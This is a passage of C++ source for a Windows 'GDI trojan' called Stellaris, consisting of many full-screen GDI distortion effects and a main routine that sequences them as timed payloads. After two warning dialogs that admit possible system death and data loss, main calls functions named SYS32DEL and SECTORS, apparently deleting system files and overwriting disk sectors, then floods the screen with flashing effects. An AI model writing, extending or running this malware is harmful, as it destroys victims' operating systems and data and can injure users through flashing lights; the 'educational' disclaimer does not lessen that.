                    "xuxuxu", "([{''}])", "Hello [REDACTED]", "LPCSTR lpStrings[] = { 'hello' };",
                    "Go away", "this place is not for you", "KILL HIM", "UNHANDLED EXCEPTION -1", "Stellaris.exe", "executed",
                    "crashed", "GetDC(NULL);", "Integrity", "2026", "come at me", "We not afraid of you",
                    "C:/Windows/System32", "afraid", "STATIC", "WHY YOU MADE THIS?", "not behind", "horror0", "string", "hi"
                };

                lFont.lfEscapement = rand() % 60;

                HFONT hFont = CreateFontIndirectW(&lFont);
                SelectObject(dc, hFont);

                SetTextColor(dc, RGB(rand() % 0xFF, rand() % 0xFF, rand() % 0xFF));
                SetBkColor(dc, RGB(rand() % 0x02, rand() % 0x02, rand() % 0x02));

                int index = rand() % 40;

                TextOutA(dc, rand() % w, rand() % h, lpStrings[index], lstrlenA(lpStrings[index]));

                Sleep(rand() % 5);
            }
        }

        return 0;
    }

    // GLOWING EFFECT
    DWORD WINAPI GLOW2(LPVOID lpParam)
    {
        while (1) {
            HDC hdc = GetDC(0);
            int x = SM_CXSCREEN;
            int y = SM_CYSCREEN;
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(0);
            BitBlt(hdc, rand() % 2, rand() % 10, w, h, hdc, rand() % 2, rand() % 10, SRCPAINT);

            Sleep(rand() % 1000);
            System::RedrawScreen();
        }

        return 0;
    }

    // DARK EFFECT
    DWORD WINAPI DARK(LPVOID lpParam) {
        HDC hdc;
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        while (1) {
            hdc = GetDC(0);
            BitBlt(hdc, rand() % 2, rand() % 12, w, h, hdc, rand() % 2, rand() % 12, SRCAND);
            Sleep(10);
            ReleaseDC(0, hdc);

            Sleep(rand() % 10);
            System::RedrawScreen();
        }

        return 0;
    }

    // RANDOM PLASMAS
    DWORD WINAPI HSVELLIPSES(LPVOID lpParam)
    {
        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        int ws = w / 4;
        int hs = h / 4;

        BITMAPINFO bmpi = { 0 };
        HBITMAP bmp;

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = ws;
        bmpi.bmiHeader.biHeight = hs;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* rgbquad = NULL;

        bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(dcCopy, bmp);

        INT i = 0;

        FLOAT a = 5.0;
        FLOAT b = 3.0;

        SetStretchBltMode(dc, COLORONCOLOR);
        SetStretchBltMode(dcCopy, COLORONCOLOR);

        while (1)
        {
            StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

            int randx = rand() % ws;
            int randy = rand() % hs;

            for (int x = 0; x < ws; x++)
            {
                for (int y = 0; y < hs; y++)
                {
                    int index = y * ws + x;

                    int cx = x - randx;
                    int cy = y - randy;

                    //(x²/a²) + (y²+b²) = 1
                    int zx = (cx * cx) / (a * a);
                    int zy = (cy * cy) / (b * b);

                    int fx = 128.0 + (128.0 * sin(sqrt(zx + zy) / 6.0));

                    HSV hsv = Colors::RGBtoHSV(rgbquad[index]);

                    hsv.h = fmod(fx + i, 360.0);

                    rgbquad[index] = Colors::HSVtoRGB(hsv);
                }
            }

            i++;

            StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

            Sleep(rand() % 1000);
            System::RedrawScreen();
        }

        return 0x00;
    }

    // EARTHQUAKE 2
    DWORD WINAPI MEDIUMSHAKE(LPVOID lpParam)
    {
        while (1) {
            HDC hdc = GetDC(0);
            int x = SM_CXSCREEN;
            int y = SM_CYSCREEN;
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);
            BitBlt(hdc, rand() % 5, rand() % 5, w, h, hdc, rand() % 5, rand() % 5, SRCCOPY);
            Sleep(10);
            ReleaseDC(0, hdc);
        }

        return 0;
    }

    // BITBLT NEON
    DWORD WINAPI BITBLTINV(LPVOID lpParam)
    {
        while (1) {
            HDC hdc = GetDC(0);
            int x = SM_CXSCREEN;
            int y = SM_CYSCREEN;
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);
            BitBlt(hdc, rand() % 5, rand() % 5, w, h, hdc, rand() % 5, rand() % 5, SRCINVERT);
            Sleep(10);
        }
    }

    // KALEIDOSCOPE SCROLLER
    DWORD WINAPI KALEIDOSCOPE(LPVOID lpParam)
    {
        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        BITMAPINFO bmpi = { 0 };
        HBITMAP bmp;

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* rgbquad = NULL;

        bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(dcCopy, bmp);

        DWORD rop = SRCCOPY;

        bool statementA = true;
        bool statementB = false;

        int scrollX, scrollY;

        int cw = w / 2;
        int ch = h / 2;

        int limit = 25;

        int i = 0;

        while (1)
        {
            StretchBlt(dcCopy, 0, 0, w, h, dc, w, 0, -cw, h, rop);
            StretchBlt(dc, 0, 0, cw, h, dcCopy, 0, 0, w, h, rop);

            StretchBlt(dcCopy, 0, 0, w, h, dc, 0, 0, w, h, rop);

            for (int x = 0; x < w; x++)
            {
                for (int y = 0; y < h; y++)
                {
                    int index = y * w + x;

                    int dx = 10;

                    if (statementA)
                    {
                        scrollX = (x + dx) % w;
                        scrollY = (y + dx) % h;
                    }

                    else if (statementB)
                    {
                        scrollX = (x + dx) % w;
                        scrollY = abs(y - dx) % h;
                    }

                    int srcIndex = scrollY * w + scrollX;

                    rgbquad[index] = rgbquad[srcIndex];
                }
            }

            StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, rop);

            StretchBlt(dcCopy, 0, 0, w, h, dc, 0, 0, w, ch, rop);
            StretchBlt(dc, 0, ch, w, ch, dcCopy, 0, h, w, -h, rop);

            Sleep(20);
        }

        return 0x00;
    }

    //RGB XOR FRACTAL ROTOZOOMER
    DWORD WINAPI ROTOXOR(LPVOID lpParam)
    {
        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        int ws = w / 4;
        int hs = h / 4;

        BITMAPINFO bmpi = { 0 };
        HBITMAP bmp;

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = ws;
        bmpi.bmiHeader.biHeight = hs;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* rgbquad = NULL;

        bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(dcCopy, bmp);

        INT i = 0;
        DOUBLE angle = 0.f;

        while (1)
        {
            StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

            RGBQUAD rgbquadCopy;

            for (int x = 0; x < ws; x++)
            {
                for (int y = 0; y < hs; y++)
                {
                    int index = y * ws + x;

                    int cx = (x - (ws / 2));
                    int cy = (y - (hs / 2));

                    int zx = cos(angle) * cx - sin(angle) * cy;
                    int zy = sin(angle) * cx + cos(angle) * cy;

                    int fx = (zx + i) ^ (zy + i);

                    rgbquad[index].rgbRed += fx;
                    rgbquad[index].rgbGreen += fx;
                    rgbquad[index].rgbBlue += fx;
                }
            }

            i++; angle += 0.01f;

            StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

            Sleep(rand() % 10);

            {
                Sleep(1000);
            }
        }

        return 0x00;
    }

    // TERMIC VISION
    DWORD WINAPI TERMIC(LPVOID lpParam)
    {
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        int scale = 4;
        int ws = w / scale;
        int hs = h / scale;

        HDC hdc = GetDC(NULL);
        HDC hdcMem = CreateCompatibleDC(hdc);

        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = ws;
        bmi.bmiHeader.biHeight = -hs;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* pixels;
        HBITMAP hbmp = CreateDIBSection(hdcMem, &bmi, DIB_RGB_COLORS, (void**)&pixels, NULL, 0);
        SelectObject(hdcMem, hbmp);

        while (true) {
            StretchBlt(hdcMem, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCCOPY);

            for (int i = 0; i < ws * hs; i++) {
                float luma = (pixels[i].rgbRed * 0.299f +
                    pixels[i].rgbGreen * 0.587f +
                    pixels[i].rgbBlue * 0.114f) / 255.0f;

                COLORREF heat = GetHeatColor(luma);

                pixels[i].rgbRed = GetRValue(heat);
                pixels[i].rgbGreen = GetGValue(heat);
                pixels[i].rgbBlue = GetBValue(heat);
            }

            StretchBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, ws, hs, SRCCOPY);

            Sleep(10);
        }

        ReleaseDC(NULL, hdc);
        DeleteDC(hdcMem);
        DeleteObject(hbmp);

        return 0;
    }

    // EARTHQUAKE 3
    DWORD WINAPI INTENSESHAKE(LPVOID lpParam)
    {
        while (1) {
            HDC hdc = GetDC(0);
            int x = SM_CXSCREEN;
            int y = SM_CYSCREEN;
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);
            BitBlt(hdc, rand() % 12, rand() % 12, w, h, hdc, rand() % 12, rand() % 12, SRCCOPY);
            Sleep(10);
            ReleaseDC(0, hdc);
        }
    }

    // RGB XOR FRACTAL
    DWORD WINAPI FINALXOR(LPVOID lpParam)
    {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);

        int ws = w / 2;
        int hs = h / 2;

        HDC hdc = GetDC(NULL);
        HDC memDC = CreateCompatibleDC(hdc);

        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = ws;
        bmpi.bmiHeader.biHeight = -hs;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;

        RGBQUAD* pixels = NULL;
        HBITMAP hBmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&pixels, NULL, 0);
        SelectObject(memDC, hBmp);

        int t = 0;

        while (true) {
            HDC currentDC = GetDC(NULL);

            StretchBlt(memDC, 0, 0, ws, hs, currentDC, 0, 0, w, h, SRCCOPY);

            for (int y = 0; y < hs; y++) {
                for (int x = 0; x < ws; x++) {
                    int index = y * ws + x;

                    int fractal = (x ^ y ^ t);

                    pixels[index].rgbRed ^= (fractal % 255);
                    pixels[index].rgbGreen ^= ((fractal * 3) % 255);
                    pixels[index].rgbBlue ^= ((fractal * 5) % 255);
                }
            }

            StretchBlt(currentDC, 0, 0, w, h, memDC, 0, 0, ws, hs, SRCINVERT);

            t += 2;

            ReleaseDC(NULL, currentDC);
            Sleep(10);
        }

        return 0;
    }

    DWORD WINAPI ROTATE(LPVOID lpParam)
    {
        HDC hdc = GetDC(0);
        RECT rekt;
        POINT rotate[3];

        while (true) {
            int rnd = rotatingeffect() % 65 + 60;

            for (int i = 0; i < rnd; i += 20) {
                GetWindowRect(GetDesktopWindow(), &rekt);

                rotate[0].x = rekt.left + i;
                rotate[0].y = rekt.top - i;
                rotate[1].x = rekt.right + i;
                rotate[1].y = rekt.top + i;
                rotate[2].x = rekt.left - i;
                rotate[2].y = rekt.bottom - i;

                PlgBlt(hdc, rotate, hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
                Sleep(40);
            }
            for (int i = 0; i < rnd; i += 20) {
                GetWindowRect(GetDesktopWindow(), &rekt);

                rotate[0].x = rekt.left - i;
                rotate[0].y = rekt.top + i;
                rotate[1].x = rekt.right - i;
                rotate[1].y = rekt.top - i;
                rotate[2].x = rekt.left + i;
                rotate[2].y = rekt.bottom + i;

                PlgBlt(hdc, rotate, hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
                Sleep(40);
            }
        }
    }
}

int main()
{
    FreeConsole();
    if (GetFileAttributesW(L"C:\\Windows\\bootcfg.dat") == INVALID_FILE_ATTRIBUTES)
    {
        if (MessageBoxW(NULL, L"WARNING!!!\n\nYou're about to run a potentially harmful program that can cause your system's death & data loss. This program also displays flashing lights and plays loud sounds.\n\nBy running this program, you accept full responsibility for any damages that may occur. The creators (OsJanelas) will not be responsible for anything caused by this software. By the way, this was created for educational and entertainment purposes.\n\nOriginal download: github.com/OsJanelas/GDI-Trojan.Win32.Stellaris\n\nWould you like to proceed with running this program?", L"'Your soul I shared, now were interwined. The mind you use, to be broken in time...'", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
        if (MessageBoxW(NULL, L"LAST WARNING!!!\n\nThis is the LAST warning, as you're already aware of the risks, press 'Yes' to continue. Otherwise, press 'No'. Also be sure you're running in a safe environment, like virtual machines.\n\nProceed at your own risk...\n\n[REDACTED]", L"GDI-Trojan.Win32.Stellaris - FINAL WARNING", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
    }
    SystemPayloads::SYS32DEL();
    SystemPayloads::SECTORS();

    // FIRST PAYLOAD (JPEG COMPRESSION)
    HANDLE hBB1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hBytebeat1 = CreateThread(NULL, NULL, &Bytebeats::FIRST, hBB1, NULL, NULL);
    HANDLE hPML1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64 * 2, 0);
    HANDLE hPayload1 = CreateThread(NULL, NULL, &GDIpayloads::JPEG, hPML1, NULL, NULL);
    Sleep(1000 * 20);
    System::EndPayload(hPayload1, hPML1);

    // SECOND PAYLOAD (SHAKING SCREEN WITH DISTORTING BLUR AND CHANGING COLORS)
    HANDLE hBB2 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64 * 2, 0);
    HANDLE hBytebeat2 = CreateThread(NULL, NULL, &Bytebeats::SECOND, hBB2, NULL, NULL);
    HANDLE hPML2 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload2 = CreateThread(NULL, NULL, &GDIpayloads::LOWSHAKE, hPML2, NULL, NULL);
    HANDLE hPML3 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload3 = CreateThread(NULL, NULL, &GDIpayloads::FIRSTCOLORS, hPML3, NULL, NULL);
    HANDLE hPML4 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload4 = CreateThread(NULL, NULL, &GDIpayloads::BLUR, hPML4, NULL, NULL);
    HANDLE hPML5 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload5 = CreateThread(NULL, NULL, &GDIpayloads::DISTORT, hPML5, NULL, NULL);
    HANDLE hSPML1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hSystem1 = CreateThread(NULL, NULL, &SystemPayloads::LABELS, hSPML1, NULL, NULL);
    Sleep(1000 * 70);
    System::EndPayload(hPayload2, hPML2);
    System::EndPayload(hPayload3, hPML3);
    System::EndPayload(hPayload4, hPML4);
    System::EndPayload(hPayload5, hPML5);

    // THIRD PAYLOAD (WAVE AND COLOR OVERDOSE)
    HANDLE hPML6 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload6 = CreateThread(NULL, NULL, &GDIpayloads::WAVE, hPML6, NULL, NULL);
    HANDLE hPML7 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload7 = CreateThread(NULL, NULL, &GDIpayloads::RGBEFFECT, hPML7, NULL, NULL);
    Sleep(1000 * 30);
    System::EndPayload(hPayload6, hPML6);
    System::EndPayload(hPayload7, hPML7);

    // FOURTH PAYLOAD (CIRCLES WITH COLOR OVERDOSE)
    HANDLE hPML8 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload8 = CreateThread(NULL, NULL, &GDIpayloads::MORERGB, hPML8, NULL, NULL);
    HANDLE hPML9 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload9 = CreateThread(NULL, NULL, &GDIpayloads::CIRCLES, hPML9, NULL, NULL);
    HANDLE hSPML2 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hSystem2 = CreateThread(NULL, NULL, &SystemPayloads::MSG, hSPML2, NULL, NULL);
    Sleep(1000 * 50);
    System::EndPayload(hPayload8, hPML8);

    // FIFTH PAYLOAD (WAVING AND INVERTING)
    HANDLE hPML10 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload10 = CreateThread(NULL, NULL, &GDIpayloads::WAVE, hPML10, NULL, NULL);
    HANDLE hPML11 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload11 = CreateThread(NULL, NULL, &GDIpayloads::INVERT, hPML11, NULL, NULL);
    Sleep(1000 * 20);
    System::EndPayload(hPayload9, hPML9);
    System::EndPayload(hPayload10, hPML10);
    System::EndPayload(hPayload11, hPML11);

    // SIXTH PAYLOAD (DISTORTING WITH PLASMA AND FIBONACCI SPHERE)
    HANDLE hPML12 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload12 = CreateThread(NULL, NULL, &GDIpayloads::WAVE, hPML12, NULL, NULL);
    HANDLE hPML13 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload13 = CreateThread(NULL, NULL, &GDIpayloads::HSVCIRCLE, hPML13, NULL, NULL);
    HANDLE hPML14 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload14 = CreateThread(NULL, NULL, &GDIpayloads::FIBONACCI, hPML14, NULL, NULL);
    Sleep(1000 * 50);
    System::EndPayload(hPayload12, hPML12);
    System::EndPayload(hPayload13, hPML13);

    // SEVENTH PAYLOAD (GLOWING WITH COLORS)
    HANDLE hPML15 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload15 = CreateThread(NULL, NULL, &GDIpayloads::GLOW1, hPML15, NULL, NULL);
    HANDLE hPML16 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload16 = CreateThread(NULL, NULL, &GDIpayloads::FIRSTCOLORS, hPML16, NULL, NULL);
    Sleep(1000 * 15);
    System::EndPayload(hPayload15, hPML15);
    System::EndPayload(hPayload16, hPML16);

    // EIGHTH PAYLOAD (TEXTS)
    HANDLE hPML17 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload17 = CreateThread(NULL, NULL, &GDIpayloads::TEXTS, hPML17, NULL, NULL);
    Sleep(1000 * 25);
    System::EndPayload(hPayload17, hPML17);

    // NINTH PAYLOAD (BITBLT WITH GLOW AND DARKR)
    HANDLE hPML18 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload18 = CreateThread(NULL, NULL, &GDIpayloads::DARK, hPML18, NULL, NULL);
    HANDLE hPML19 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload19 = CreateThread(NULL, NULL, &GDIpayloads::GLOW2, hPML19, NULL, NULL);
    HANDLE hPML20 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload20 = CreateThread(NULL, NULL, &GDIpayloads::BITBLTINV, hPML20, NULL, NULL);
    Sleep(1000 * 25);
    System::EndPayload(hPayload15, hPML15);
    System::EndPayload(hPayload16, hPML16);
    System::EndPayload(hPayload19, hPML19);
    System::EndPayload(hPayload20, hPML20);

    // TENTH PAYLOAD (SHAKING SCREEN WITH PLASMA AND TERMIC)
    HANDLE hPML21 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload21 = CreateThread(NULL, NULL, &GDIpayloads::MEDIUMSHAKE, hPML21, NULL, NULL);
    HANDLE hPML22 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload22 = CreateThread(NULL, NULL, &GDIpayloads::HSVELLIPSES, hPML22, NULL, NULL);
    HANDLE hPML23 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload23 = CreateThread(NULL, NULL, &GDIpayloads::TERMIC, hPML23, NULL, NULL);
    Sleep(1000 * 50);
    System::EndPayload(hPayload22, hPML22);
    System::EndPayload(hPayload23, hPML23);

    // ELEVENTH PAYLOAD (COLOR OVERDOSE)
    HANDLE hPML24 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload24 = CreateThread(NULL, NULL, &GDIpayloads::MORERGB, hPML24, NULL, NULL);
    Sleep(1000 * 20);

    // TWELFTH PAYLOAD (KALEIDOSCOPE
    HANDLE hPML25 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload25 = CreateThread(NULL, NULL, & GDIpayloads::KALEIDOSCOPE, hPML25, NULL, NULL);
    Sleep(1000 * 60);
    System::EndPayload(hPayload25, hPML25);
    System::EndPayload(hPayload24, hPML24);
    System::EndPayload(hPayload21, hPML21);

    // THIRTEENTH PAYLOAD (PLASMAS)
    HANDLE hPML26 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload26 = CreateThread(NULL, NULL, &GDIpayloads::HSVELLIPSES, hPML26, NULL, NULL);
    HANDLE hPML27 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload27 = CreateThread(NULL, NULL, &GDIpayloads::HSVCIRCLE, hPML27, NULL, NULL);
    Sleep(1000 * 30);

    // FOURTEENTH PAYLOAD (TERMIC VISION AND XOR ROTOZOOMER)
    HANDLE hPML28 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload28 = CreateThread(NULL, NULL, &GDIpayloads::ROTOXOR, hPML28, NULL, NULL);
    HANDLE hPML29 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload29 = CreateThread(NULL, NULL, &GDIpayloads::TERMIC, hPML29, NULL, NULL);
    Sleep(1000 * 50);

    // FIFTEENTH PAYLOAD (OTHER EFFECTS)
    HANDLE hPML30 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload30 = CreateThread(NULL, NULL, &GDIpayloads::MORERGB, hPML30, NULL, NULL);
    HANDLE hPML31 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload31 = CreateThread(NULL, NULL, &GDIpayloads::KALEIDOSCOPE, hPML31, NULL, NULL);
    HANDLE hPML32 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload32 = CreateThread(NULL, NULL, &GDIpayloads::RGBEFFECT, hPML32, NULL, NULL);
    HANDLE hPML33 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload33 = CreateThread(NULL, NULL, &GDIpayloads::DARK, hPML33, NULL, NULL);
    HANDLE hPML34 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload34 = CreateThread(NULL, NULL, &GDIpayloads::GLOW2, hPML34, NULL, NULL);
    HANDLE hPML35 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload35 = CreateThread(NULL, NULL, &GDIpayloads::BITBLTINV, hPML35, NULL, NULL);
    HANDLE hPML36 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload36 = CreateThread(NULL, NULL, &GDIpayloads::DISTORT, hPML36, NULL, NULL);
    HANDLE hPML37 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload37 = CreateThread(NULL, NULL, &GDIpayloads::WAVE, hPML37, NULL, NULL);
    HANDLE hPML38 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload38 = CreateThread(NULL, NULL, &GDIpayloads::TEXTS, hPML38, NULL, NULL);
    HANDLE hPML39 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload39 = CreateThread(NULL, NULL, &GDIpayloads::INTENSESHAKE, hPML39, NULL, NULL);
    HANDLE hPML40 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload40 = CreateThread(NULL, NULL, &GDIpayloads::ROTATE, hPML40, NULL, NULL);
    Sleep(1000 * 40);
    System::EndPayload(hPayload26, hPML26);
    System::EndPayload(hPayload27, hPML27);
    System::EndPayload(hPayload28, hPML28);
    System::EndPayload(hPayload29, hPML29);
    System::EndPayload(hPayload30, hPML30);
    System::EndPayload(hPayload31, hPML31);
    System::EndPayload(hPayload32, hPML32);
    System::EndPayload(hPayload33, hPML33);
    System::EndPayload(hPayload34, hPML34);
    System::EndPayload(hPayload35, hPML35);
    System::EndPayload(hPayload36, hPML36);
    System::EndPayload(hPayload37, hPML37);
    System::EndPayload(hPayload38, hPML38);
    System::EndPayload(hPayload39, hPML39);

    // SIXTEENTH PAYLOAD (FINAL XOR FRACTAL)
    HANDLE hPML41 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
    HANDLE hPayload41 = CreateThread(NULL, NULL, &GDIpayloads::FINALXOR, hPML41, NULL, NULL);
    Sleep(INFINITE);

    return 0;
}